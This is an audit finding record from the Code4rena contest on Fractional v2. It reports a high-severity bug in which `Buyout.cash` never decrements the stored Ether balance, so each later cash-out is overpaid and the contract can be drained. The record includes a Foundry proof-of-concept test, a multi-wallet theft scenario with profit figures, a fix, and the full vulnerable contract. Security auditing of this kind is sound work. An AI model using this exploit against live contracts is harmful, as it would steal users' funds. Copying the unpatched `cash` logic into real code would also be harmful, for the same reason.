{
  "Title": "[H-08] Cash-out from a successful buyout allows an attacker to drain Ether from the `Buyout` contract",
  "Content": "_Submitted by berndartmueller, also found by 0xA5DF, 0xsanson, 0xSky, cccz, cryptphi, ElKu, hansfriese, jonatascm, kenzo, Kumpa, minhquanym, s3cunda, shenwilly, smiling&#95;heretic, Treasure-Seeker, TrungOre, and zzzitron_\n\nThe function `Buyout.cash` allows a user to cash out proceeds (Ether) from a successful vault buyout.\n\nHowever, due to how `buyoutShare` is calculated in `Buyout.cash`, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in `buyoutInfo[_vault].ethBalance`. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the `Buyout` contract.\n\n### Proof of Concept\n\nCopy paste the following test case into `Buyout.t.sol` and run the test via `forge test -vvv --match-test testCashDrainEther`:\n\nThe test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in `10 ether`). Alice and Eve are both entitled to receive `5 ether` each. Alice receives the correct amount when cashing out, however, due to a miscalculation of `buyoutShare` (see [#L268-L269](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out `10 ether` from the `Buyout` contract.\n\n```solidity\nfunction testCashDrainEther() public {\n  /// ==================\n  /// ===== SETUP =====\n  /// ==================\n\n  deployBaseVault(alice, TOTAL_SUPPLY);\n  (token, tokenId) = registry.vaultToToken(vault);\n  alice.ferc1155 = new FERC1155BS(address(0), 111, token);\n  bob.ferc1155 = new FERC1155BS(address(0), 222, token);\n  eve.ferc1155 = new FERC1155BS(address(0), 333, token);\n\n  buyout = address(buyoutModule);\n  proposalPeriod = buyoutModule.PROPOSAL_PERIOD();\n  rejectionPeriod = buyoutModule.REJECTION_PERIOD();\n\n  vm.label(vault, \"VaultProxy\");\n  vm.label(token, \"Token\");\n\n  setApproval(alice, vault, true);\n  setApproval(alice, buyout, true);\n  setApproval(bob, vault, true);\n  setApproval(bob, buyout, true);\n  setApproval(eve, vault, true);\n  setApproval(eve, buyout, true);\n\n  alice.ferc1155.safeTransferFrom(\n      alice.addr,\n      bob.addr,\n      1,\n      6000,\n      \"\"\n  );\n\n  alice.ferc1155.safeTransferFrom(\n      alice.addr,\n      eve.addr,\n      1,\n      2000,\n      \"\"\n  );\n  /// ==================\n  /// ===== SETUP END =====\n  /// ==================\n\n  /// Fraction balances:\n  assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000\n  assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000\n  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000\n\n  bob.buyoutModule.start{value: 10 ether}(vault);\n\n  assertEq(getETHBalance(buyout), 10 ether);\n\n  /// Bob (proposer of buyout) transfered his fractions to buyout contract\n  assertEq(getFractionBalance(buyout), 6000);\n\n  vm.warp(rejectionPeriod + 1);\n\n  bob.buyoutModule.end(vault, burnProof);\n\n  /// Fraction balances after buyout ended:\n  assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000\n  assertEq(getFractionBalance(bob.addr), 0); // Bob: 0\n  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000\n\n  assertEq(getETHBalance(buyout), 10 ether);\n\n  /// Alice cashes out 2000 fractions -> 5 ETH (correct amount)\n  alice.buyoutModule.cash(vault, burnProof);\n\n  assertEq(getFractionBalance(alice.addr), 0);\n  assertEq(getETHBalance(alice.addr), 105 ether);\n\n  /// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH\n  eve.buyoutModule.cash(vault, burnProof);\n}\n```\n\n**Additionally** to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:\n\n1.  Attacker deploys a vault with `10.000` fractions minted\n2.  51% of fractions (`5.100`) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, `980` fractions each)\n3.  With the first wallet, the attacker starts a buyout with `10 ether` - fractions are transferred into the `Buyout` contract as well as `10 ether`\n4.  Attacker waits for `REJECTION_PERIOD` to elapse to call `Buyout.end` (51% of fractions are already held in the contract, therefore no need for voting)\n5.  After the successful buyout, the attacker uses the `Buyout.cash` function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the `Buyout` contract:\n    1.  Wallet 1 - `buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether` (`totalSupply = 3920` after burning `980` fractions from wallet 1)\n    2.  Wallet 2 - `buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether` (`totalSupply = 2940` after burning `980` fractions from wallet 2)\n    3.  Wallet 3 - `buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether` (`totalSupply = 1960` after burning `980` fractions from wallet 3)\n    4.  Wallet 4 - `buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether` (`totalSupply = 980` after burning `980` fractions from wallet 4)\n    5.  Wallet 5 - `buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether` (`totalSupply = 0` after burning `980` fractions from wallet 5)\n\nIf summed up, cashing out the 5 wallets, the attacker receives `22.8 ether` in total. Making a profit of `12.8 ether`.\n\nThis can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the `Buyout` contract.\n\n### Recommended Mitigation Steps\n\nDecrement `ethBalance` from buyout info `buyoutInfo[_vault].ethBalance -= buyoutShare;` in `Buyout.cash` (see `@audit-info` annotation):\n\n```solidity\nfunction cash(address _vault, bytes32[] calldata _burnProof) external {\n    // Reverts if address is not a registered vault\n    (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n        _vault\n    );\n    if (id == 0) revert NotVault(_vault);\n    // Reverts if auction state is not successful\n    (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);\n    State required = State.SUCCESS;\n    if (current != required) revert InvalidState(required, current);\n    // Reverts if caller has a balance of zero fractional tokens\n    uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);\n    if (tokenBalance == 0) revert NoFractions();\n\n    // Initializes vault transaction\n    bytes memory data = abi.encodeCall(\n        ISupply.burn,\n        (msg.sender, tokenBalance)\n    );\n    // Executes burn of fractional tokens from caller\n    IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n    // Transfers buyout share amount to caller based on total supply\n    uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n    uint256 buyoutShare = (tokenBalance * ethBalance) /\n        (totalSupply + tokenBalance);\n    buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement `ethBalance` by `buyoutShare`\n    _sendEthOrWeth(msg.sender, buyoutShare);\n    // Emits event for cashing out of buyout pool\n    emit Cash(_vault, msg.sender, buyoutShare);\n}\n```\n\n**[stevennevins (Fractional) confirmed](https://github.com/code-423n4/2022-07-fractional-findings/issues/440)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/440#issuecomment-1203320091):**\n > When more than 1 user calls `Buyout.cash`, users will receive more ETH than expected - leaving a deficit so that later users are unable to access their funds. Agree this is a High risk issue.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
  "Code": [
    {
      "filename": "src/modules/Buyout.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {ISupply} from \"../interfaces/ISupply.sol\";\nimport {ITransfer} from \"../interfaces/ITransfer.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {SafeSend} from \"../utils/SafeSend.sol\";\nimport {SelfPermit} from \"../utils/SelfPermit.sol\";\n\n/// @title Buyout\n/// @author Fractional Art\n/// @notice Module contract for vaults to hold buyout pools\n/// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool.\n/// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether.\n/// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether.\n/// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer\n///   gains access to withdraw the underlying assets (ERC20, ERC721, and ERC1155 tokens) from the vault.\n///   Otherwise the buyout is considered unsuccessful and a new one may then begin.\n/// - NOTE: A vault may only have one active buyout at any given time.\n/// - buyoutPrice = (ethDeposit * 100) / (100 - ((fractionDeposit * 100) / totalSupply))\n/// - buyoutShare = (tokenBalance * ethBalance) / (totalSupply + tokenBalance)\ncontract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Address of Supply target contract\n    address public supply;\n    /// @notice Address of Transfer target contract\n    address public transfer;\n    /// @notice Time length of the proposal period\n    uint256 public constant PROPOSAL_PERIOD = 2 days;\n    /// @notice Time length of the rejection period\n    uint256 public constant REJECTION_PERIOD = 4 days;\n    /// @notice Mapping of vault address to auction struct\n    mapping(address => Auction) public buyoutInfo;\n\n    /// @notice Initializes registry, supply, and transfer contracts\n    constructor(\n        address _registry,\n        address _supply,\n        address _transfer\n    ) {\n        registry = _registry;\n        supply = _supply;\n        transfer = _transfer;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Starts the auction for a buyout pool\n    /// @param _vault Address of the vault\n    function start(address _vault) external payable {\n        // Reverts if ether deposit amount is zero\n        if (msg.value == 0) revert ZeroDeposit();\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Gets total supply of fractional tokens for the vault\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        // Gets total balance of fractional tokens owned by caller\n        uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id);\n\n        // Transfers fractional tokens into the buyout pool\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            depositAmount,\n            \"\"\n        );\n\n        // Calculates price of buyout and fractions\n        // @dev Reverts with division error if called with total supply of tokens\n        uint256 buyoutPrice = (msg.value * 100) /\n            (100 - ((depositAmount * 100) / totalSupply));\n        uint256 fractionPrice = buyoutPrice / totalSupply;\n\n        // Sets info mapping of the vault address to auction struct\n        buyoutInfo[_vault] = Auction(\n            block.timestamp,\n            msg.sender,\n            State.LIVE,\n            fractionPrice,\n            msg.value,\n            totalSupply\n        );\n        // Emits event for starting auction\n        emit Start(\n            _vault,\n            msg.sender,\n            block.timestamp,\n            buyoutPrice,\n            fractionPrice\n        );\n    }\n\n    /// @notice Sells fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function sellFractions(address _vault, uint256 _amount) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        // Reverts if auction state is not live\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of proposal period\n        uint256 endTime = startTime + PROPOSAL_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n\n        // Transfers fractional tokens to pool from caller\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n\n        // Updates ether balance of pool\n        uint256 ethAmount = fractionPrice * _amount;\n        buyoutInfo[_vault].ethBalance -= ethAmount;\n        // Transfers ether amount to caller\n        _sendEthOrWeth(msg.sender, ethAmount);\n        // Emits event for selling fractions into pool\n        emit SellFractions(msg.sender, _amount);\n    }\n\n    /// @notice Buys fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function buyFractions(address _vault, uint256 _amount) external payable {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of rejection period\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n        // Reverts if payment amount does not equal price of fractional amount\n        if (msg.value != fractionPrice * _amount) revert InvalidPayment();\n\n        // Transfers fractional tokens to caller\n        IERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates ether balance of pool\n        buyoutInfo[_vault].ethBalance += msg.value;\n        // Emits event for buying fractions from pool\n        emit BuyFractions(msg.sender, _amount);\n    }\n\n    /// @notice Ends the auction for a live buyout pool\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function end(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (\n            uint256 startTime,\n            address proposer,\n            State current,\n            ,\n            uint256 ethBalance,\n\n        ) = this.buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is less than or equal to end time of auction\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp <= endTime)\n            revert TimeNotElapsed(block.timestamp, endTime);\n\n        uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);\n        // Checks totalSupply of auction pool to determine if buyout is successful or not\n        if (\n            (tokenBalance * 1000) /\n                IVaultRegistry(registry).totalSupply(_vault) >\n            500\n        ) {\n            // Initializes vault transaction\n            bytes memory data = abi.encodeCall(\n                ISupply.burn,\n                (address(this), tokenBalance)\n            );\n            // Executes burn of fractional tokens from pool\n            IVault(payable(_vault)).execute(supply, data, _burnProof);\n            // Sets buyout state to successful\n            buyoutInfo[_vault].state = State.SUCCESS;\n            // Emits event for ending successful auction\n            emit End(_vault, State.SUCCESS, proposer);\n        } else {\n            // Deletes auction info\n            delete buyoutInfo[_vault];\n            // Transfers fractions and ether back to proposer of the buyout pool\n            IERC1155(token).safeTransferFrom(\n                address(this),\n                proposer,\n                id,\n                tokenBalance,\n                \"\"\n            );\n            _sendEthOrWeth(proposer, ethBalance);\n            // Emits event for ending unsuccessful auction\n            emit End(_vault, State.INACTIVE, proposer);\n        }\n    }\n\n    /// @notice Cashes out proceeds from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function cash(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller has a balance of zero fractional tokens\n        uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);\n        if (tokenBalance == 0) revert NoFractions();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ISupply.burn,\n            (msg.sender, tokenBalance)\n        );\n        // Executes burn of fractional tokens from caller\n        IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n        // Transfers buyout share amount to caller based on total supply\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        uint256 buyoutShare = (tokenBalance * ethBalance) /\n            (totalSupply + tokenBalance);\n        _sendEthOrWeth(msg.sender, buyoutShare);\n        // Emits event for cashing out of buyout pool\n        emit Cash(_vault, msg.sender, buyoutShare);\n    }\n\n    /// @notice Terminates a vault with an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function redeem(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Initializes vault transaction\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        bytes memory data = abi.encodeCall(\n            ISupply.burn,\n            (msg.sender, totalSupply)\n        );\n        // Executes burn of fractional tokens from caller\n        IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n        // Sets buyout state to successful and proposer to caller\n        (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = (\n            State.SUCCESS,\n            msg.sender\n        );\n        // Emits event for redeem underlying assets from the vault\n        emit Redeem(_vault, msg.sender);\n    }\n\n    /// @notice Withdraws an ERC-20 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _value Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller is not the auction winner\n        if (msg.sender != proposer) revert NotWinner();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC20Transfer,\n            (_token, _to, _value)\n        );\n        // Executes transfer of ERC721 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof);\n    }\n\n    /// @notice Withdraws an ERC-721 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller is not the auction winner\n        if (msg.sender != proposer) revert NotWinner();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC721TransferFrom,\n            (_token, _vault, _to, _tokenId)\n        );\n        // Executes transfer of ERC721 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);\n    }\n\n    /// @notice Withdraws an ERC-1155 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _id ID of the token type\n    /// @param _value Transfer amount\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        // Creates local scope to avoid stack too deep\n        {\n            // Reverts if address is not a registered vault\n            (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n            if (id == 0) revert NotVault(_vault);\n            // Reverts if auction state is not successful\n            (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n            State required = State.SUCCESS;\n            if (current != required) revert InvalidState(required, current);\n            // Reverts if caller is not the auction winner\n            if (msg.sender != proposer) revert NotWinner();\n        }\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC1155TransferFrom,\n            (_token, _vault, _to, _id, _value)\n        );\n        // Executes transfer of ERC1155 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc1155TransferProof);\n    }\n\n    /// @notice Batch withdraws ERC-1155 tokens from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _ids IDs of each token type\n    /// @param _values Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for transferring multiple ERC-1155 tokens\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] calldata _ids,\n        uint256[] calldata _values,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        // Creates local scope to avoid stack too deep\n        {\n            // Reverts if address is not a registered vault\n            (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n            if (id == 0) revert NotVault(_vault);\n            // Reverts if auction state is not successful\n            (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n            State required = State.SUCCESS;\n            if (current != required) revert InvalidState(required, current);\n            // Reverts if caller is not the auction winner\n            if (msg.sender != proposer) revert NotWinner();\n        }\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC1155BatchTransferFrom,\n            (_token, _vault, _to, _ids, _values)\n        );\n        // Executes batch transfer of multiple ERC1155 tokens to caller\n        IVault(payable(_vault)).execute(\n            transfer,\n            data,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Gets the list of leaf nodes used to generate a merkle tree\n    /// @dev Leaf nodes are hashed permissions of the merkle tree\n    /// @return nodes Hashes of leaf nodes\n    function getLeafNodes() external view returns (bytes32[] memory nodes) {\n        nodes = new bytes32[](5);\n        // Gets list of permissions from this module\n        Permission[] memory permissions = getPermissions();\n        for (uint256 i; i < permissions.length; ) {\n            // Hashes permission into leaf node\n            nodes[i] = keccak256(abi.encode(permissions[i]));\n            // Can't overflow since loop is a fixed size\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @notice Gets the list of permissions installed on a vault\n    /// @dev Permissions consist of a module contract, target contract, and function selector\n    /// @return permissions List of vault permissions\n    function getPermissions()\n        public\n        view\n        returns (Permission[] memory permissions)\n    {\n        permissions = new Permission[](5);\n        // Burn function selector from supply contract\n        permissions[0] = Permission(\n            address(this),\n            supply,\n            ISupply(supply).burn.selector\n        );\n        // ERC20Transfer function selector from transfer contract\n        permissions[1] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC20Transfer.selector\n        );\n        // ERC721TransferFrom function selector from transfer contract\n        permissions[2] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC721TransferFrom.selector\n        );\n        // ERC1155TransferFrom function selector from transfer contract\n        permissions[3] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC1155TransferFrom.selector\n        );\n        // ERC1155BatchTransferFrom function selector from transfer contract\n        permissions[4] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC1155BatchTransferFrom.selector\n        );\n    }\n}"
    }
  ]
}